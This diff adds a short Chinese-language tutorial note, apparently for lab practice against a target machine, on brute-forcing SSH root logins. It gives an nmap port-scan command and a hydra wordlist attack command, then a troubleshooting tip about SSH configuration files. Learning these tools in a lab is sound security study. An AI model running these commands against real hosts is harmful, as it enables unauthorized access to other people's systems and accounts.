@@ -1,0 +1,9 @@
+hydra破解工具可以用来暴力破解很多协议的登录密码。
+
+一、破解ssh
+先确认对方机器的ssh端口开放：
+nmap -p 22 -open -sV one_IP_or_range_or_subnet
+实施爆破：
+hydra -s 22 -v -l root -P wordlist.txt ssh://ip
+注意：
+实验过程中，如果第一步扫描发现对方22端口是开放的，密码字典也有正确的密码，但是爆破失败，手动执行ssh提示“Permission denied”，有可能是靶机的ssh配置有问题，检查/etc/ssh/ssh_config和sshd_config文件里的配置项
